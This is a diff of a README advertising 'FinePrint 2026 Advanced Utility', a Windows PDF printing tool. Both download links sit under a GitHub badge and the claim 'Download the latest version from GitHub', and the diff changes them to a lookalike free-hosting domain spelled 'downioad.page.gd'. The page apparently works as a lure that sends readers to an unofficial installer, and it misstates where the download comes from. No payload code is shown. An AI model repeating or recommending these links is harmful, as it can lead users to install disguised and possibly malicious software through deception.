@@ -2,7 +2,7 @@
 
 FinePrint 2026 Advanced Utility is a comprehensive software solution designed to elevate your PDF printing experience on Windows. This tool provides a suite of advanced features for managing and optimizing print jobs, making it ideal for both personal and professional use. With its intuitive interface and powerful capabilities, FinePrint 2026 Advanced Utility streamlines workflows and enhances productivity.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Overview
 
@@ -62,7 +62,7 @@ FinePrint 2026 Advanced Utility is available as a one-time purchase with free up
 
 To access the latest version of FinePrint 2026 Advanced Utility, visit the official download page.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
